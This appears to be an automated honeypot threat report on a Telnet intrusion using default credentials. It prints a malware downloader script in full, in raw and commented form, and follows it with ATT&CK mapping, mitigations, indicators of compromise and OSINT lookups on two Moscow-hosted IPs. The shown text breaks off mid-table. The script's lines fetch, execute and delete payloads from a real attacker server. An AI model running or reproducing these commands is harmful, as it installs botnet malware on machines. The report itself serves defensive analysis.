<h4>Raw Malware Sample 0/1 Sha256 HASH: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed</h4>
</summary>

**Standardized** Sha256 HASH: `f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed`

**Sample Below** Sha256 HASH: `f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed`
````bash
#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/m-i.p-s.ISIS; chmod +x m-i.p-s.ISIS; ./m-i.p-s.ISIS; rm -rf m-i.p-s.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/m-p.s-l.ISIS; chmod +x m-p.s-l.ISIS; ./m-p.s-l.ISIS; rm -rf m-p.s-l.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/s-h.4-.ISIS; chmod +x s-h.4-.ISIS; ./s-h.4-.ISIS; rm -rf s-h.4-.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/x-8.6-.ISIS; chmod +x x-8.6-.ISIS; ./x-8.6-.ISIS; rm -rf x-8.6-.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/a-r.m-6.ISIS; chmod +x a-r.m-6.ISIS; ./a-r.m-6.ISIS; rm -rf a-r.m-6.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/x-3.2-.ISIS; chmod +x x-3.2-.ISIS; ./x-3.2-.ISIS; rm -rf x-3.2-.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/a-r.m-7.ISIS; chmod +x a-r.m-7.ISIS; ./a-r.m-7.ISIS; rm -rf a-r.m-7.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/p-p.c-.ISIS; chmod +x p-p.c-.ISIS; ./p-p.c-.ISIS; rm -rf p-p.c-.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/i-5.8-6.ISIS; chmod +x i-5.8-6.ISIS; ./i-5.8-6.ISIS; rm -rf i-5.8-6.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/m-6.8-k.ISIS; chmod +x m-6.8-k.ISIS; ./m-6.8-k.ISIS; rm -rf m-6.8-k.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/p-p.c-.ISIS; chmod +x p-p.c-.ISIS; ./p-p.c-.ISIS; rm -rf p-p.c-.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/a-r.m-4.ISIS; chmod +x a-r.m-4.ISIS; ./a-r.m-4.ISIS; rm -rf a-r.m-4.ISIS
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.242.89.170/a-r.m-5.ISIS; chmod +x a-r.m-5.ISIS; ./a-r.m-5.ISIS; rm -rf a-r.m-5.ISIS

````

</details>

---


### Commented Malware Sample & Explanation

<details>
<summary>
<h4>
Standardized Malware Sample 0/1 Sha256 HASH: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed</h4>
</summary>


````bash
#!/bin/bash
# Change directory to temporary folders or the root directory; use whichever is successful first.
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
# Download the first malicious script, make it executable, run it, and then remove it.
wget http://87.242.89.170/m-i.p-s.ISIS; chmod +x m-i.p-s.ISIS; ./m-i.p-s.ISIS; rm -rf m-i.p-s.ISIS
# Repeat the process for each additional malicious script hosted at 87.242.89.170
# Each downloaded script seems to be part of a batch of malware all tasked with different activities.
# The malware is executed and immediately removed after execution to minimize the traces of the attack.

````

</details>

---

The provided Bash script is an example of a rudimentary malware downloader and executor. It's designed to be run on Linux systems and performs a series of similar actions for different downloaded files, all of which are presumed to be malicious payloads. The steps are as follows:

1. Change the current working directory to `/tmp`, or another directory writable by the user such as `/var/run`, `/mnt`, `/root`, or the root directory `/`. The specific target directory is chosen based on the first successful `cd` command using the logical OR operator `||`. This tactic is commonly used to find a directory where the executing user has sufficient permissions to write and execute files.

2. Use `wget` to download a malicious script from the specified IP address. This IP address is the remote host controlled by the attacker, hosting the malware files.

3. Change the permissions of the downloaded script to be executable (using `chmod +x`).

4. Execute the downloaded script (using `./script_name`).

5. Remove the script using `rm -rf`, deleting it to reduce forensic evidence or detection by antivirus software.

This process is repeated for multiple versions of malware, each likely serving a different role in a wider attack—ranging from initial system reconnaissance to establishing persistent access or exploiting local vulnerabilities.

The commands run by the attacker indicate that they obtained a shell access (`sh`), navigated to writable directories, downloaded this script (`wget`), gave it full permissions (`chmod 777 *`), executed it, downloaded additional files using `tftp`, executed those as well, then cleaned up by removing the scripts and clearing the command history (`history -c`). This suggests an attempt to evade detection and maintain persistence on the system.

# Which vulnerability does the attack attempt to exploit?
The information provided and the analysis of the commands executed during the attack does not directly mention or imply specific vulnerabilities that are being exploited. The attack involved the use of stolen or default credentials (`root:vizxv`) to gain unauthorized access to the honeypot via Telnet. This method does not exploit a software vulnerability; rather, it takes advantage of weak security practices—namely, the use of default or easily guessable credentials.

After gaining access, the attacker executed commands to download and run shell scripts from a remote server. This type of attack leverages poor configuration or lax security controls rather than exploiting a specific vulnerability in software. The execution of these scripts could potentially lead to the exploitation of vulnerabilities depending on what the scripts are designed to do; however, without insight into the contents of the scripts or the activities they perform, we cannot conclusively identify any specific software vulnerabilities being targeted.

What can be said is that an attack like this might attempt to exploit known vulnerabilities on exposed services (such as FTP, SSH, web servers) if access was not obtained through default credentials. To check for such vulnerabilities, one would typically analyze the scripts downloaded by the malware, scan the compromised system for indicators of such exploits, or monitor for network traffic that could be indicative of vulnerability scanning or exploitation attempts.

Without hard evidence of vulnerabilities being actively exploited in this context, such as logs, error messages, script contents detailing exploitation methods, CVE numbers, or ExploitDB codes, we cannot provide precise details of exploited vulnerabilities or related exploit names and example code from ExploitDB. If you have specific scripts or logs that indicate such activity, please provide them for further analysis.


# MITRE ATT&CK
Based on the available information on the attack, here are several relevant MITRE ATT&CK tactics and techniques that could be used to classify this incident:

**Initial Access (TA0001)**:
- **Exploit Public-Facing Application (T1190)**: The attack on the Linux honeypot server, which involved logging in over Telnet, can be seen as exploiting a publicly accessible application. While there was no specific exploit of a vulnerability, the use of default or stolen credentials falls under this category.
- **Valid Accounts (T1078)**: The attacker utilized known credentials (root:vizxv) for accessing the server, indicating the use of valid accounts to gain initial access.

**Execution (TA0002)**:
- **Command and Scripting Interpreter: Unix Shell (T1059.004)**: The attacker executed shell commands and scripts on the system to carry out action after gaining access.

**Persistence (TA0003)**:
- As the commands are meant to create and execute new processes, if any of the downloaded scripts included mechanisms to maintain access, the following techniques could be applicable:
  - **Unix Shell Configuration Modification (T1546.004)**: If the scripts modify bashrc or other shell configuration files for persistence.

**Privilege Escalation (TA0004)**:
- If the downloaded scripts attempt to escalate privileges via various means, they would fall under this tactic.

**Defense Evasion (TA0005)**:
- **Indicator Removal on Host: File Deletion (T1070.004)**: The downloaded scripts were removed after execution, which is a method to avoid detection by security tools or forensic analysis.
- **Modify Authentication Process: Use of Default Accounts (T1078)**: Using standard accounts with common credentials may suggest an attempt to blend in with normal user activity.

**Credential Access (TA0006)**:
- This tactic may be relevant if any of the scripts are designed to steal or intercept credentials from the system or network services.

**Discovery (TA0007)**:
- If the scripts performed reconnaissance or system/network discovery functions, this category could apply.

**Lateral Movement (TA0008)**:
- This would be relevant if the scripts attempted to access additional systems in the network.

**Collection (TA0009)**:
- If the scripts gathered data from the system for exfiltration, they would align with this tactic.

**Command and Control (TA0011)**:
- The downloaded scripts may have established communication with the attacker-controlled server to receive additional instructions or to exfiltrate data.

**Exfiltration (TA0010)**:
- If the scripts transferred data to an external location, this tactic would apply.

**Impact (TA0040)**:
- Depending on the intent of the scripts (e.g., disruption, data destruction), the impact might vary.

Each of these classifications would depend on specific behavior exhibited by the downloaded scripts and the broader objectives of the attack campaign. The MITRE ATT&CK framework is designed to be modular and descriptive, so additional or different tactics and techniques may apply as more information about the attack becomes available.

# What Is The Goal Of The Attack?
Based on the analysis of the commands executed in the attack and the other information available, the goal of the attack appears to be multi-faceted:

1. **Unauthorized Access**: The initial goal was gaining unauthorized access to the honeypot system using stolen or default credentials (`root:vizxv`). This was accomplished by exploiting weak security practices rather than a specific vulnerability.

2. **Malware Downloader Execution**: Once access was secured, the attacker's goal shifted to the execution of a bash script that functions as a malware downloader. The downloader script was used to retrieve additional malicious scripts from a remote server (`87.242.89.170`).

3. **Further Malicious Payloads**: Each downloaded script could have a specific goal, typically including:
   - Establishing persistence on the compromised system.
   - Collecting and exfiltrating sensitive data from the compromised server.
   - Installing additional malware, such as a backdoor, to facilitate sustained access for the attacker.
   - Enlisting the compromised system into a botnet or using it to conduct other malicious activities like Distributed Denial of Service (DDoS) attacks, cryptocurrency mining, or as a staging point for lateral movement within the network.

4. **Covering Tracks and Evasion**: The attacker made efforts to remove the downloaded scripts and clear the command history to minimize traces of the attack. This suggests a goal to remain undetected and potentially maintain access for an extended period.

5. **Infrastructure Expansion**: By successfully compromising and controlling multiple systems, the attacker could be aiming to expand their malicious infrastructure, which could be used for various campaigns or monetized in different ways.

While the precise objectives of the downloaded scripts are not known in this analysis, the behavior indicated by the commands and the characteristics of the attack suggest the goals mentioned above. These goals are indicative of a broader strategy to compromise systems for various potential ends, including financial gain, further cyber attacks, or establishing a foothold within targeted networks.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
The success of the attack in this case did not depend on exploiting a specific vulnerability in the system's software or configuration. Instead, the attack was successful because it used a simple method of unauthorized access through Telnet using stolen or default credentials (`root:vizxv`). Hence, the attacker was able to bypass the need for exploiting a technical vulnerability by leveraging weak security practices.

Given the specific details of this attack:

- If the system’s Telnet service was configured with strong, unique credentials, the attacker’s initial login attempt would likely have failed, preventing the subsequent download and execution of the malware.
- If the system’s file permissions were securely configured to restrict execution of arbitrary scripts, especially in writable directories, the downloaded malware may not have executed successfully, reducing the impact of the attack.
- If the system had network-level defenses in place, such as a firewall blocking outgoing connections to the attacker's server, or the URLs the scripts attempted to access, the malware would fail to download and execute.
- If the system employed a comprehensive monitoring solution, the unusual activities such as the downloading and execution of scripts from a suspicious server could have been detected, possibly alerting admins to take mitigative actions before the attack succeeded.

Even if the system was vulnerable in other ways—such as unpatched software vulnerabilities—the attacker in this instance did not require those vulnerabilities to compromise the system. This attack highlights the importance of basic security precautions such as using strong credentials, reducing the attack surface by disabling unnecessary services like Telnet, and employing network security and monitoring to prevent unauthorized access and execution of malicious payloads.

# How Can A System Be Protected From This Attack?
To protect a system from this type of attack, which relies on compromised credentials and the execution of malicious scripts, various security measures and best practices should be implemented:

1. **Use Strong Authentication**:
   - Disable default accounts and passwords.
   - Ensure that strong, complex, and unique passwords are used for all accounts.
   - Implement multi-factor authentication where possible.

2. **Restrict Network Services**:
   - Disable unnecessary services like Telnet which are outdated and less secure; use SSH instead.
   - Limit administrative interfaces to local management networks.

3. **Apply Principle of Least Privilege**:
   - Only grant users the minimum level of access and permissions required for their role.

4. **Regularly Update and Patch Systems**:
   - Keep systems and installed software up to date with the latest patches.
   - Regularly scan for vulnerabilities and remediate any discovered issues promptly.

5. **Network Security Measures**:
   - Use firewalls to control inbound and outbound network traffic based on an approved list of IP addresses and ports.
   - Implement Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) to monitor for and potentially block malicious activity.

6. **Endpoint Protection**:
   - Install reputable antivirus and anti-malware solutions and keep their definitions up to date.
   - Use application whitelisting to prevent the execution of unauthorized software.

7. **Security Awareness Training**:
   - Provide training to users and administrators about security best practices, including identifying phishing attempts and managing credentials securely.

8. **Monitoring and Logging**:
   - Implement system monitoring to detect unusual activity or unauthorized access attempts.
   - Ensure comprehensive logging of system access and changes for forensic analysis in case of a breach.

9. **Incident Response Planning**:
   - Develop and maintain an incident response plan to quickly respond to security incidents.

10. **Secure Configuration**:
    - Harden systems by following security frameworks such as the CIS Benchmarks or NIST guidelines.
    - Review and lock down configurations, such as file permissions and network services.

11. **Backup and Disaster Recovery**:
    - Maintain regular backups and ensure that a tested disaster recovery plan is in place.

By implementing a layered approach to security, combining these measures will greatly enhance a system's defenses, reduce its attack surface, and mitigate the impact of various cyber threats, including those resembling the attack described.

# What Are The Indicators Of Compromise (Iocs) For This Attack?
The Indicators of Compromise (IOCs) for this attack include several items that were identified through the analysis of the honeypot logs and the OSINT data. Here are the key IOCs:

1. **Source IP Address**:
   - `87.242.92.23`: The IP address used to initiate the Telnet session and execute commands on the honeypot system.

2. **Download URLs and Host**:
   - `http://87.242.89.170/ISIS.sh`: The URL used to download the initial shell script.
   - Additional URLs/host associated with the payload scripts mentioned in the `ISIS.sh` script, such as `http://87.242.89.170/m-i.p-s.ISIS`, `http://87.242.89.170/m-p.s-l.ISIS`, etc.

3. **Malware Hash**:
   - `f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed`: SHA256 hash of the initial shell script downloaded and executed on the honeypot system.

4. **Malicious Files**:
   - Any of the files named in the `ISIS.sh` script, such as `m-i.p-s.ISIS`, `m-p.s-l.ISIS`, etc., which were downloaded and executed.

5. **User Credentials**:
   - User credentials used in the attack: `root` with the password `vizxv`.

6. **Malicious Commands**:
   - A series of commands executed in the session, involving changing directory (`cd`), file download (`wget`), modifying file permissions (`chmod +x`), running scripts (`./<scriptname>`), and cleanup (`rm -rf <scriptname>`).
   
7. **Network Artifacts and Sessions**:
   - Telnet sessions to port `2223` that are not part of normal traffic patterns.
   - Any outbound connections to `87.242.89.170` or similar addresses not normally contacted by the system.

8. **TTPs (Tactics, Techniques, and Procedures)**:
   - Using default or compromised credentials for initial access.
   - Downloading and executing shell scripts for further exploitation.
   - Self-deletion of scripts to evade detection.

These IOCs can be used in security tools for detection and response. It's important to note that IOCs can change over time as attackers modify their strategies, and IP addresses or domains can be reassigned or taken down. Continuous monitoring and adaptive security measures are necessary for robust defense against evolving threats.

# What do you know about the attacker?
The critical findings across all OSINT sources regarding the attack on the Linux honeypot are as follows:

**Attack Overview**:
- The attacker utilized the IP address `87.242.92.23` to engage in a multi-stage attack against a honeypot exposed on port `2223`.
- The attack included successful Telnet logins using hardcoded credentials and the execution of a series of shell commands designed to download and run malicious scripts.

**Attacker's IP (`87.242.92.23`)**:
- Geolocation: Moscow, Russian Federation.
- Associated with a Data Center/Web Hosting/Transit ISP: Cloud Technology Limited (Ltd.).
- Identified as presenting a 61% risk including 51 reports by 23 users.
- Detected scanning the internet and participating in botnet activities.
- OpenSSH 7.4 detected on port 22.

**Related IP (`87.242.89.170`)**:
- Hosts multiple malicious URLs as identified by different payloads being downloaded from this address.
- Shares similar organization details and is associated with network infrastructure based in Russia under the same ASN as the attacker's IP.

**Malware Analysis**:
- Malware ID: f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed, a shell script designed to download and execute further malicious payloads.
- Source of download: `87.242.89.170`.
- Detected and reported by multiple users on URLhaus, with considerable antivirus detection rate on VirusTotal.
- Both IPs linked to "Cloud Technologies" LLC and identified within network range `87.242.84.0 - 87.242.95.255`.
- The downloaded malware scripts were initially hosted on `87.242.89.170` and designed to gain persistence by executing and then removing themselves.

**Data Center Hosting and Botnet Activities**:
- Both IPs are used for data center or web hosting, and they have been reported being part of botnet operations.
- The attacking IP has been reported for abusive network behavior, including scanning.

**Takedown Efforts**:
- The URL `http://87.242.89.170/ISIS.sh` hosting the malware was reported and has been taken offline.

The findings suggest an organized cyber attack possibly involving a botnet, emanating from infrastructure based in Russia associated with the ISP Cloud Technology Limited (Ltd. / Cloud.ru). The goal of the attack appears to be to compromise systems via Telnet access, download, and execute malware to achieve further malicious objectives, such as enlisting compromised systems into botnets or other unauthorized activities.

<details>
<summary>
<h2>IP Locations</h2>
</summary>


### IP Locations Summary
Here is the summarized geolocation and related information for both IP addresses involved in the attack:

For `87.242.92.23`:
- Location: Moscow, Russian Federation
- Organization: Cloud Technology Limited (Ltd.)
- ISP: Cloud Technology Limited (Ltd.)
- ASN: AS208677
- Usage: Data Center/Web Hosting/Transit
- Risk level: Reportedly 61% based on AbuseIPDB
- Reports include: 
  - 51 reports by 23 users according to AbuseIPDB with the last report on December 14, 2023
  - Last scan reported by GreyNoise on December 16, 2023
  - Found in 2 reports by DShield/ISC, last seen on December 16, 2023
  - Found in 1 pulse-feed by AlienVault OTX
- Abusive network behavior: Found in Duggy Tuxy - EU Botnets/Zombies/Scanners
- OpenSSH 7.4 running on port 22

For `87.242.89.170`:
- Location: Moscow, Russian Federation
- Organization: "Cloud Technologies" LLC trading as Cloud.ru
- ISP: "Cloud Technologies" LLC trading as Cloud.ru
- ASN: AS208677
- Open services include:
  - vsFTPd 3.0.2 on port 21
  - OpenSSH 7.4 on port 22
  - Apache HTTPD 2.4.6 on port 80

The data suggests that both IP addresses are related to the same organization, Cloud.ru, which operates in the data center and web hosting industry. Both IPs are associated with malicious activities and have been reported for scanning and possibly partaking in botnet activities. The IP addresses are closely related and might be part of the same network, considering they share the same ASN, geolocation, and are both operating in the Russian Federation under the same ISP.

* This attack involved `2` unique IP addresses. `1` were source IPs.`1` unique IPs and `1` unique URLS were found in the commands.`1` unique IPs and `1` unique URLS were found in malware.
* The most common **Country** of origin was `Russian Federation`, which was seen `2` times.
* The most common **City** of origin was `Moscow`, which was seen `2` times.
* The most common **ISP** of origin was `Cloud technology Limited (Ltd.)`, which was seen `1` times.
* The most common **Organization** of origin was `Cloud technology Limited (Ltd.)`, which was seen `1` times.
* The most common **ASN** of origin was `AS208677`, which was seen `2` times.
* The most common **network** of origin was `87.242.88.0/21`, which was seen `2` times.


| IP Address | Country | City | ISP | Organization | ASN | Network |
| --- | --- | --- | --- | --- | --- | --- |
| 87.242.92.23 | Russian Federation | Moscow | Cloud technology Limited (Ltd.) | Cloud technology Limited (Ltd.) | AS208677 | 87.242.88.0/21 |
| 87.242.89.170 | Russian Federation | Moscow | "Cloud Technologies" LLC trading as Cloud.ru | Cloud Technologies LLC trading as Cloud.ru | AS208677 | 87.242.88.0/21 |

</details>

---


<details>
<summary>
<h2>CyberGordon</h2>
</summary>


### CyberGordon Results Summary
Based on CyberGordon data, here's what is known about the IP address `87.242.92.23` involved in the attack:

- **ISP**: Cloud.ru
- **Usage**: Data Center/Web Hosting/Transit
- **Risk**: 61%
- **Reports**: 
  - 51 report(s) by 23 user(s), last on December 14, 2023, according to [E2] AbuseIPDB
  - Last report on December 16, 2023, as unknown and scanning the Internet in the last 3 months by [E33] GreyNoise
  - Found in 2 report(s) listing 2 target(s), last on December 16, 2023, according to [E11] DShield/ISC
  - Found in 1 pulse-feed(s) by [E12] AlienVault OTX
- **Abusive Network Behavior**: Found in Duggy Tuxy - EU Botnets/Zombies/Scanners

There is no CyberGordon data provided for the IP address `87.242.89.170` in the provided information. The available data for `87.242.92.23` indicates that this IP is associated with a high risk of abuse and has been reported multiple times across various platforms for malicious activities, such as scanning and participating in botnet operations.

* `17` total alerts were found across all engines.
* `3` were **high** priority. 
* `8` were **medium** priority. 
* `6` were **low** priority. 
* The IP address with the **most high priority alerts** was `87.242.89.170` with `2` alerts.


| IP Addresss | Alerts High \| Med \| Low | [E1] IPinfo | [E2] AbuseIPDB | [E4] urlscan.io | [E7] Google DNS | [E11] DShield/ISC | [E12] AlienVault OTX | [E17] Pulsedive | [E23] Offline Feeds | [E26] MetaDefender | [E33] GreyNoise | [E34] IPdata.co |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 87.242.89.170 | `2` \| `4` \| `3` | <details>`Geo: Moscow, Moscow, RU. Network: AS208677 "Cloud Technologies" LLC trading as Cloud.ru. `<summary>`low`</summary></details> | <details>` ISP: Cloud.ru. Usage: Data Center/Web Hosting/Transit. Risk 2%. 1 report(s) by 1 user(s), last on 23 December 2023  `<summary>`medium`</summary></details> | <details>`Found in 25 scan(s). Reported in urlhaus feed(s). Top 5 domains: 87.242.89.170 (25) `<summary>`medium`</summary></details> | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 108 report(s) listing 4 target(s), last on 16 Dec 2023 `<summary>`high`</summary></details> | <details>`Found in 3 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: unknown. Last seen on 20 Jan 2024. `<summary>`low`</summary></details> | None | <details>`Found in 1 sources: webroot.com (trustworthy), avira.com (Malware) `<summary>`medium`</summary></details> | None | <details>`Geo: Russia. Network: AS208677, Cloud Technologies LLC Trading as Cloud, hosting. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch, DigitalSide. `<summary>`high`</summary></details> |
| 87.242.92.23 | `1` \| `4` \| `3` | <details>`Geo: Moscow, Moscow, RU. Network: AS208677 "Cloud Technologies" LLC trading as Cloud.ru. `<summary>`low`</summary></details> | <details>` ISP: Cloud.ru. Usage: Data Center/Web Hosting/Transit. Risk 61%. 51 report(s) by 23 user(s), last on 14 December 2023  `<summary>`high`</summary></details> | None | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 2 report(s) listing 2 target(s), last on 16 Dec 2023 `<summary>`medium`</summary></details> | <details>`Found in 1 pulse-feed(s) `<summary>`medium`</summary></details> | None | <details>`Found in Duggy Tuxy - EU Botnets/Zombies/Scanners `<summary>`medium`</summary></details> | None | <details>`Last report on 16 December 2023 as unknown and scanning the Internet in the last 3 months. `<summary>`medium`</summary></details> | <details>`Geo: Russia. Network: AS208677, Cloud Technologies LLC Trading as Cloud, hosting. Security risk(s): none. Blocklist(s): none. `<summary>`low`</summary></details> |

### CyberGordon Results

<details>
<summary>
<h3>Cybergordon results for: 87.242.92.23</h3>
</summary>


### Cybergordon results for: 87.242.92.23 [https://cybergordon.com/r/1112c8ba-2b56-456f-9e6d-83caa3f58717](https://cybergordon.com/r/1112c8ba-2b56-456f-9e6d-83caa3f58717)

| Engine | Results | Url |
| --- | --- | --- |
| [E2] AbuseIPDB |  ISP: Cloud.ru. Usage: Data Center/Web Hosting/Transit. Risk 61%. 51 report(s) by 23 user(s), last on 14 December 2023   | https://www.abuseipdb.com/check/87.242.92.23 |
| [E33] GreyNoise | Last report on 16 December 2023 as unknown and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/87.242.92.23 |
| [E11] DShield/ISC | Found in 2 report(s) listing 2 target(s), last on 16 Dec 2023  | https://isc.sans.edu/ipinfo.html?ip=87.242.92.23 |
| [E12] AlienVault OTX | Found in 1 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/87.242.92.23 |
| [E23] Offline Feeds | Found in Duggy Tuxy - EU Botnets/Zombies/Scanners  | / |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=23.92.242.87.in-addr.arpa&type=PTR |
| [E1] IPinfo | Geo: Moscow, Moscow, RU. Network: AS208677 "Cloud Technologies" LLC trading as Cloud.ru.  | https://ipinfo.io/87.242.92.23 |
| [E34] IPdata.co | Geo: Russia. Network: AS208677, Cloud Technologies LLC Trading as Cloud, hosting. Security risk(s): none. Blocklist(s): none.  | https://ipdata.co |

</details>

---


<details>
<summary>
<h3>Cybergordon results for: 87.242.89.170</h3>
</summary>


### Cybergordon results for: 87.242.89.170 [https://cybergordon.com/r/8eb637ae-a228-405e-9c8c-c70d915b69ce](https://cybergordon.com/r/8eb637ae-a228-405e-9c8c-c70d915b69ce)

| Engine | Results | Url |
| --- | --- | --- |
| [E34] IPdata.co | Geo: Russia. Network: AS208677, Cloud Technologies LLC Trading as Cloud, hosting. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch, DigitalSide.  | https://ipdata.co |
| [E11] DShield/ISC | Found in 108 report(s) listing 4 target(s), last on 16 Dec 2023  | https://isc.sans.edu/ipinfo.html?ip=87.242.89.170 |
| [E2] AbuseIPDB |  ISP: Cloud.ru. Usage: Data Center/Web Hosting/Transit. Risk 2%. 1 report(s) by 1 user(s), last on 23 December 2023   | https://www.abuseipdb.com/check/87.242.89.170 |
| [E26] MetaDefender | Found in 1 sources: webroot.com (trustworthy), avira.com (Malware)  | https://metadefender.opswat.com |
| [E4] urlscan.io | Found in 25 scan(s). Reported in urlhaus feed(s). Top 5 domains: 87.242.89.170 (25)  | https://urlscan.io/search/#ip%3A%2287.242.89.170%22 |
| [E12] AlienVault OTX | Found in 3 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/87.242.89.170 |
| [E17] Pulsedive | Risk: unknown. Last seen on 20 Jan 2024.  | https://pulsedive.com/browse |
| [E1] IPinfo | Geo: Moscow, Moscow, RU. Network: AS208677 "Cloud Technologies" LLC trading as Cloud.ru.  | https://ipinfo.io/87.242.89.170 |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=170.89.242.87.in-addr.arpa&type=PTR |

</details>

---


</details>

---


<details>
<summary>
<h2>Shodan</h2>
</summary>


### Shodan Results Summary
Based on Shodan data, here is what is known about the IP addresses involved in the attack:

For `87.242.92.23`:
- Location: Moscow, Russian Federation
- Organization: Cloud technology Limited (Ltd.)
- ISP: Cloud technology Limited (Ltd.)
- ASN: AS208677
- OpenSSH 7.4 running on port 22

For `87.242.89.170`:
- Location: Moscow, Russian Federation
- Organization: "Cloud Technologies" LLC trading as Cloud.ru
- ISP: "Cloud Technologies" LLC trading as Cloud.ru
- ASN: AS208677
- Open services detected:
  - vsFTPd 3.0.2 on port 21 (FTP service)
  - OpenSSH 7.4 on port 22 (SSH service)
  - Apache HTTPD 2.4.6 on port 80 (HTTP service)

Shodan data shows that these IP addresses host services that are typically associated with a standard internet-connected server, including FTP, SSH, and HTTP services. These IPs are both located in Moscow within the same organization which could indicate they are part of the same or a closely related infrastructure, potentially suggesting an organized or targeted attack.

- The most common **open port** was `22`, which was seen `2` times.
- The most common **protocol** was `tcp`, which was seen `4` times.
- The most common **service name** was `OpenSSH7.4`, which was seen `2` times.
- The most common **service signature** was `SSH-2.0-OpenSSH_7.4`, which was seen `2` times.
- The most common **Country** was `Russian Federation`, which was seen `2` times.
- The most common **City** was `Moscow`, which was seen `2` times.
- The most common **Organization** was `Cloud technology Limited (Ltd.)`, which was seen `1` times.
- The most common **ISP** was `Cloud technology Limited (Ltd.)`, which was seen `1` times.
- The most common **ASN** was `AS208677`, which was seen `2` times.
- The IP address with the **most open ports** was `87.242.89.170` with `3` open ports.

| IP Addresss | # Open Ports | 21 | 22 | 80 |
| --- | --- | --- | --- | --- |
| 87.242.89.170 | <details>`21`, `22`, `80`<summary>`3`</summary></details> | unknown | OpenSSH7.4 | Apache httpd2.4.6 |
| 87.242.92.23 | <details>`22`<summary>`1`</summary></details> | - | OpenSSH7.4 | - |

<details>
<summary>
<h4>Top 3 Open Ports</h4>
</summary>

Total Open Ports: `4`
Unique: `3`

| Open Port | Times Seen |
| --- | --- |
| `22` | `2` |
| `21` | `1` |
| `80` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Protocols</h4>
</summary>

Total Protocols: `4`
Unique: `1`

| Protocol | Times Seen |
| --- | --- |
| `tcp` | `4` |

</details>

---




<details>
<summary>
<h4>Top 3 Service Names</h4>
</summary>

Total Service Names: `4`
Unique: `3`

| Service Name | Times Seen |
| --- | --- |
| `OpenSSH7.4` | `2` |
| `unknown` | `1` |
| `Apache httpd2.4.6` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Service Signatures</h4>
</summary>

Total Service Signatures: `4`
Unique: `3`

| Service Signature | Times Seen |
| --- | --- |
| `SSH-2.0-OpenSSH_7.4` | `2` |
| `220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK.` | `1` |
| `HTTP/1.1 403 Forbidden` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Countrys</h4>
</summary>

Total Countrys: `2`
Unique: `1`

| Country | Times Seen |
| --- | --- |
| `Russian Federation` | `2` |

</details>

---




<details>
<summary>
<h4>Top 1 Citys</h4>
</summary>

Total Citys: `2`
Unique: `1`

| City | Times Seen |
| --- | --- |
| `Moscow` | `2` |

</details>

---




<details>
<summary>
<h4>Top 2 Organizations</h4>
</summary>

Total Organizations: `2`
Unique: `2`

| Organization | Times Seen |
| --- | --- |
| `Cloud technology Limited (Ltd.)` | `1` |
| `Cloud Technologies LLC trading as Cloud.ru` | `1` |

</details>

---




<details>
<summary>
<h4>Top 2 ISPs</h4>
</summary>

Total ISPs: `2`
Unique: `2`

| ISP | Times Seen |
| --- | --- |
| `Cloud technology Limited (Ltd.)` | `1` |
| `"Cloud Technologies" LLC trading as Cloud.ru` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 ASNs</h4>
</summary>

Total ASNs: `2`
Unique: `1`

| ASN | Times Seen |
| --- | --- |
| `AS208677` | `2` |

</details>

---


### Shodan Results

<details>
<summary>
<h3>Shodan results for: 87.242.92.23</h3>
</summary>


### Shodan results for: 87.242.92.23 [https://www.shodan.io/host/87.242.92.23](https://www.shodan.io/host/87.242.92.23)

| Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- |
| Russian Federation | Moscow | Cloud technology Limited (Ltd.) | Cloud technology Limited (Ltd.) | AS208677 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
